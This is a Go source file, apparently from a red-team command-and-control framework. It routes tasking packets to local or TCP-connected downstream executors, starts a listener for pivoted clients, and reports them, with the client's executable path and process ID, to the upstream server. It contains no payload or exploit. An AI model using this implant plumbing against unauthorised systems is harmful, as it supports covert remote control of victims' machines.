package client

import (
	"fmt"
	"os"
	"strconv"
	"strings"

	"github.com/dobin/antnium/pkg/model"
	log "github.com/sirupsen/logrus"
)

// Only used to translate downstream specific downstreaminfos from children
// into a more managable struct.
type DownstreamInfo struct {
	Name string
	Info string
}

type DownstreamManager struct {
	upstream UpstreamHttp // used to send notifications

	downstreamClient     DownstreamClient
	downstreamClientInfo string

	downstreamLocaltcp        DownstreamLocaltcp
	downstreamLocaltcpChannel chan struct{} // Notify only
}

func MakeDownstreamManager(upstream UpstreamHttp) DownstreamManager {
	// Get our name (for channel identification)
	ex, err := os.Executable()
	if err != nil {
		log.Error("Error: " + err.Error())
	}
	pid := strconv.Itoa(os.Getpid())
	downstreamClientInfo := ex + ":" + pid + "\n"

	downstreamClient := MakeDownstreamClient()
	downstreamLocaltcp := MakeDownstreamLocaltcp("")

	downstreamManager := DownstreamManager{
		upstream:                  upstream,
		downstreamClient:          downstreamClient,
		downstreamClientInfo:      downstreamClientInfo,
		downstreamLocaltcp:        downstreamLocaltcp,
		downstreamLocaltcpChannel: make(chan struct{}),
	}
	return downstreamManager
}

func (dm *DownstreamManager) Do(packet model.Packet) (model.Packet, error) {
	if packet.DownstreamId == "manager" {
		return dm.doManager(packet)
	} else if packet.DownstreamId == "client" {
		return dm.downstreamClient.do(packet)
	} else if strings.HasPrefix(packet.DownstreamId, "net") { // net#1
		return dm.downstreamLocaltcp.do(packet)
	} else {
		return dm.downstreamClient.do(packet)
	}
}

func (dm *DownstreamManager) doManager(packet model.Packet) (model.Packet, error) {
	if packet.DownstreamId != "manager" {
		return packet, fmt.Errorf("Wrong args")
	}
	if packet.PacketType == "downstreamStart" {
		log.Info("Downstreamstart")
		ret, err := dm.StartListeners()
		if err != nil {
			packet.Response["err"] = err.Error()
		} else {
			packet.Response["ret"] = ret
		}
	} else {
		packet.Response["ret"] = "packettype not known"
	}

	return packet, nil
}

// startListeners will set up all downstreams which have a listening component as threads
func (dm *DownstreamManager) StartListeners() (string, error) {
	// Thread: new downstreams via downstreamLocaltcpChannel
	go dm.downstreamLocaltcp.startServer(dm.downstreamLocaltcpChannel)

	// Thread: receive new downstreams via local tcp, lifetime: app
	go func() {
		for {
			// Wait for newly announced TCP downstreams
			<-dm.downstreamLocaltcpChannel

			// Notify server
			dm.SendDownstreams()

			// TODO when to quit thread
		}
	}()

	return "Started on ...", nil
}

func (dm *DownstreamManager) SendDownstreams() {
	// notify server of new downstream executors

	downstreams := make([]DownstreamInfo, 0)
	downstreamInfoClient := DownstreamInfo{
		"client",
		dm.downstreamClientInfo,
	}
	downstreamInfoTcp := dm.downstreamLocaltcp.DownstreamList()
	downstreams = append(downstreams, downstreamInfoClient)
	downstreams = append(downstreams, downstreamInfoTcp...)

	arguments := make(model.PacketArgument)
	response := make(model.PacketResponse)
	for idx, downstreamInfo := range downstreams {
		idxStr := strconv.Itoa(idx)
		response["name"+idxStr] = downstreamInfo.Name
		response["info"+idxStr] = downstreamInfo.Info
	}
	packet := model.NewPacket("downstreams", "", "", arguments, response)

	err := dm.upstream.SendOutofband(packet)
	if err != nil {
		log.Errorf("Senddownstreams send error: %s", err.Error())
	}
}
